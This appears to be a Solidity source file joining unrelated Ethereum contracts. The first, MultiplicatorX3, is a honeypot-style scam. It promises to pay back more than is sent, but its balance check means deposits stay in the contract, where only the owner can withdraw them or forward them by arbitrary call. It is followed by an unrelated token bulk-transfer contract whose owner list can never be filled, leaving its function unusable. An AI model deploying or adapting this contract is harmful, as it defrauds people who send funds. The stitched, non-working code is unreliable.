 

pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}
contract SNOVToken {
    function transfer(address _to, uint256 _value) public returns (bool success);
}

contract MultiOwnable {

    mapping(address => bool) ownerMap;
    address[] public owners;

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address owner) public constant returns (bool) {
        return ownerMap[owner];
    }
}

contract MultiTransfer is MultiOwnable {
    
    function MultiTransaction(address _tokenAddress, address[] _addresses, uint256[] _values) public onlyOwner {
        SNOVToken token = SNOVToken(_tokenAddress);
        for (uint256 i = 0; i < _addresses.length; i++) {
            token.transfer(_addresses[i], _values[i]);
        }
    }
}
